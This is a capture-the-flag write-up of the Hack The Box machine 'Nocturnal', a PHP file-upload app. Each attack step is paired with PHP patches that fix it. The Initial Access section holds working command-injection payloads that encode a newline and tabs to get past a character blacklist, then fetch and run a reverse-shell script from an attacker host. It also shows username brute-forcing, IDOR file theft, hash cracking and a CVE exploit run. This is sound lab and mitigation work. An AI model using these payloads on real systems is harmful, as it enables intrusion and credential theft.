---
title: Nocturnal
date: 2025-08-31 00:00:00 -0800
categories: [Patch the Box]
tags: [hack the box,linux,web-app,php]
description: This box deals primarily with a custom PHP based application that's used for file uploads and supports multiple users. Lack of access controls and injection vulnerabilities are exploited with mitigation measures discussed and applied.
image:
  path: https://i.postimg.cc/xdV4LTXg/nocturnal-preview.png
---

### Overview

Nocturnal is the directly accessible PHP based web application that allows for users to upload and access files with some additional administrator features. The application is vulnerable to username enumeration, Insecure Direct Object References (IDOR), command injection. CVE-2023-46818 is exploitable in the privilege escalation portion, which involved authenticated code execution in the ISPConfig localhost instance. Prevention measures are discussed and focuses on testing done with the Nocturnal file upload application.

### Attack Tactics

#### Reconnaissance (CWE-200)

This machine only had ports 22 and 80 open after running a full TCP nmap scan. The underlying web server is Nginix with PHP used server side. There is a register and login page that allows basic functionality of the application to be tested. It was quickly discovered that files can be uploaded on the dashboard page and are then accessible with a GET request at `/view.php?username=<USER>&file=<FILE.EXT>`. When attempting to upload a `test.php` file I got the following response:

```console
Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.
```

From here I tried uploading files with different Content-Types, using the magic byte/file headers for valid files, and fuzzing various duplicate file extension permutations. When attempting to register as `admin` this failed so brute forcing for valid usernames was a suspected attack path. I was not fully testing the available user functionality and succumbed to a hint from my Hack The Box team to see there was an `amanda` user with an interesting file accessible. This led me to go back and do the username brute force attempt. I initially did this against the `register.php` page:

```bash
ffuf -request register.req -request-proto http -w /usr/share/seclists/Usernames/Names/names.txt -fc 302
```

This did work but is not ideal as it also creates these user accounts as it iterates through the wordlist. Doing a similar fuzz against the `view.php` page would avoid this.

A small list of usernames was returned:

```console
admin           [Status: 200, Size: 715, Words: 150, Lines: 23, Duration: 214ms]
amanda          [Status: 200, Size: 715, Words: 150, Lines: 23, Duration: 282ms]
gale            [Status: 200, Size: 715, Words: 150, Lines: 23, Duration: 190ms]
rosie           [Status: 200, Size: 715, Words: 150, Lines: 23, Duration: 164ms]
tobias          [Status: 200, Size: 715, Words: 150, Lines: 23, Duration: 185ms]
```

Username enumeration falls under Common Weakness Enumeration-200, "different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong."[^1] This allows an attacker to discern valid usernames and typically affords enough information to conduct password attacks easier.

> __Prevent:__ Generalizing the responses for `register.php` and `view.php` would prevent those pages from easily outputting detectable differences:
{: .prompt-tip}

Related update in `register.php`:
```php
// Generalize the response for successful registration and existing users
// Single statement instead of prior if/else
$stmt->execute();
$_SESSION['success'] = 'User registered successfully or user already exists.';
header('Location: login.php');
exit();
```

Related update in `view.php`:
```php
// Generalize the bottom two else blocks
// Remove the showAvailableFiles call if a GET request is sent for a non-existent file to further limit exposure
            } else {
                echo "<div class='error'>File not found on the server.</div>";
                showAvailableFiles($user_id, $db);
            }
        } else {
            echo "<div class='error'>User not found or file does not exist.</div>";
            //showAvailableFiles($user_id, $db);
        }
    } else {
        echo "<div class='error'>User not found or file does not exist.</div>";
    }
```

Verifying that valid users and non-existent ones (nobody) do not show differences however, if valid usernames and filenames were brute forced (discussed below) this shows the clear response difference (amanda):

```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=privacy.odt' -b 'PHPSESSID=chlbis3br6g8vfih2n8jh470l5' -w users.tx
```

![image](https://i.postimg.cc/tR1vvmLL/nocturnal-ffuf.png){: width='743' height='110'}

#### Credential Access (IDOR)

I then googled a [filename wordlist](https://github.com/emadshanab/WordLists-20111129/blob/master/Filenames_or_Directories_All.wordlist) to create a unique `filenames.txt` with extensions stripped. Running nested for loops with ffuf and the known valid file extensions I could test for multiple common filenames for the known usernames:

```bash
for user in $(<"./users.txt"); do for ext in $(<"./valid-extentsions.txt"); do ffuf -w filenames.txt -u "http://nocturnal.htb/view.php?username=$user&file=FUZZ.$ext" -mc all -fc 302; done; done
```

This part was not necessary since valid usernames can attempt to access non-existent files and the application will display any uploaded files they have. This does stress the need for IDOR controls though as this type of brute force attack would still work even if the application did not provide available filenames for valid users.

The single file returned after running this for a relatively short time (I think I stepped away for 10-20 minutes) was a `privacy.odt` file.

```bash
curl "http://nocturnal.htb/view.php?username=amanda&file=privacy.odt" -b "PHPSESSID=pf98gpmhsvh0hd7chtj7bmmon5" --output ./privacy.odt
```

In this file was an IT team note containing Amanda's temporary password. This allowed access to the Nocturnal site and showed that she was an admin based on an available `admin.php` page from the Dashboard.

> __Prevent:__ Implementing a form of Role Based Access Control (RBAC) for the files would be most effective. RBAC can also be complemented with object references that are not easily predictable. This latter control was implemented by using a simple `uid` in place of the `username` across the various related PHP files and the database:
{: .prompt-tip}

First an additional column was added to the database for UIDs as well as setting the existing users with a value:

```bash
sqlite3 nocturnal_database.db
ALTER TABLE users ADD COLUMN uid TEXT;
UPDATE users
SET uid = lower(hex(randomblob(16)));
```

Update `login.php` so the SESSION also stores the `uid`:

```php
$_SESSION['uid'] = $result['uid'];
```

There's another update to `register.php` so new users get the `$uid` value added in the database:

```php
$stmt = $db->prepare("INSERT INTO users (username, password, uid) VALUES (:username, :password, lower(hex(randomblob(16))))");
```

Then `dashboard.php` needs to include `$uid` and be accessible in the hyperlink instead of directly referencing the predictable `$username`:

```php
$uid = $_SESSION['uid'];

<a href="view.php?uid=<?php echo urlencode($uid); ?>&file=<?php echo urlencode($row['file_name']); ?>">
```

Finally, `view.php` also needs to be updated again in multiple sections where previously used "username" is swapped with "uid" in either the PHP variable or corresponding parameter:

```php
// Three lines of direct swaps of "username" with "uid"
$uid = $_GET['uid'];
$stmt = $db->prepare('SELECT id FROM users WHERE uid = :uid');
$stmt->bindValue(':uid', $uid, SQLITE3_TEXT);

// Existing Foreign Key in "uploads" Table can be used, i.e., no additional changes needed to fetch files from "/uploads" directory
if ($row = $result->fetchArray()) {
    $user_id = $row['id'];

// Use "uid" again instead of "username" for bottom portion of this function
function showAvailableFiles($user_id, $db) {
    $stmt = $db->prepare('SELECT file_name FROM uploads WHERE user_id = :user_id');
    $stmt->bindValue(':user_id', $user_id, SQLITE3_INTEGER);
    $result = $stmt->execute();

    echo "<h2>Available files for download:</h2>";
    echo "<ul>";

    while ($row = $result->fetchArray()) {
        $file_name = $row['file_name'];
        echo '<li><a href="view.php?uid=' . urlencode($_GET['uid']) . '&file=' . urlencode($file_name) . '">' . htmlspecialchars($file_name) . '</a></li>';
    }
```

Resulting `uid` being used in `view.php` hyperlink. Subsequent file download also functioned as before:

![image](https://i.postimg.cc/QNYzmK0x/nocturnal-uid.png){: width='1218' height='701'}

#### Initial Access (Command Injection)

With Amanda's admin access the `admin.php` page lets you view the main PHP page's source code for the site and create password protected backups.

![image](https://i.postimg.cc/3JZn65xJ/nocturnal-create-backup.png){: width='695' height='696'}

The code for the `admin.php` page itself showed this line which appeared to have the `$password` input susceptible to command injection since this command is later passed to `proc_open`:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile
```

The `admin.php` page further shows which characters it denies with a custom function that's used before the password is passed to the zip command:

```php
function cleanEntry($entry) {
  $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

  foreach ($blacklist_chars as $char) {
    if (strpos($entry, $char) !== false) {
      return false; // Malicious input detected
    }
  }
```

Using this knowledge and testing with commands with characters like URL encoded versions of newline (%0a) and tab (%09) can allow for a reverse shell to be downloaded and then ran. POST payloads to `admin.php` in Burp:

```console
password=%0abash%09-c%09"wget%0910.10.14.190:9001/shell.sh"&backup=

password=%0abash%09-c%09"bash%09shell.sh"&backup=
```

This provided a shell as `www-data`. From previously looking at the various PHP files it was noted that a SQLite database was in use. The file was transferred and then queried to gather hashes:

```bash
sqlite3 nocturnal_database.db "SELECT username,password FROM users" -separator : > db-creds.txt
```

The user Tobais' hash was cracked and his password was valid for SSH access:

```bash
john --format=raw-MD5 -w=/usr/share/wordlists/rockyou.txt db-creds.txt
```

> __Prevent:__ : "As of PHP 7.4.0, `command` may be passed as array of command parameters. In this case the process will be opened directly (without going through a shell) and PHP will take care of any necessary argument escaping."[^2]
{: .prompt-tip}

![image](https://i.postimg.cc/SKpZtWBC/nocturnal-command-array.png){: width='951' height='207'}

In addition to passing `$command` as an array I also added `%` to the list of blocked characters because while testing this the URL encoded commands passed to `zip`'s password parameter were applied as decoded input for the password.

![image](https://i.postimg.cc/Vs43rH3T/nocturnal-cleanentry.png){: width='612' height='123'}

That is, `$password` payload that was no longer injectable (with just the array of parameters passed):

```bash
%0abash%09-c%09"wget%0910.10.14.190:9001/shell.sh"
```

With related password that was used to successfully access the protected backup:

```bash
unzip -P $'\nbash\t-c\t&quot;wget\t10.10.14.190:9001/shell.sh&quot;' backup_2025-08-29.zip
```

#### Privilege Escalation (CVE-2023-46818)

After logging in as Tobias I noticed there were two unusual accounts with shell access. Searching these names, I was quickly able to find exploits related to it for [CVE-2023-46818](https://github.com/rvizx/CVE-2023-46818?tab=readme-ov-file). Netstat showed a service running on loopback 8080, so a port forward was setup and I was greeted with a login page for ISPConfig. Tobais' credentials were reused with the username `admin` so the exploit was easily confirmed to provide root access.

![image](https://i.postimg.cc/3RRznrTG/nocturnal-privesc.png){: width='783' height='553'}

```bash
./exploit.sh 127.0.0.1:9000 admin slowmotionapocalypse
```

### Further Reading and Watching
- [How to Prevent IDORs](https://www.youtube.com/watch?v=H8kO96LFwV4)
- [UUID Versions Explained](https://www.sohamkamani.com/uuid-versions-explained/)
- [PHP - uniqid](https://www.php.net/manual/en/function.uniqid.php)
- [SQLite - randomblob](https://sqlite.org/lang_corefunc.html#randomblob)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses)
- [ISPConfig - language_edit.php](https://karmainsecurity.com/KIS-2023-13)

#### Footnotes
[^1]: [https://cwe.mitre.org/data/definitions/200.html#Demonstrative+Examples](https://cwe.mitre.org/data/definitions/200.html#Demonstrative+Examples)
[^2]: [https://www.php.net/manual/en/function.proc-open.php](https://www.php.net/manual/en/function.proc-open.php)
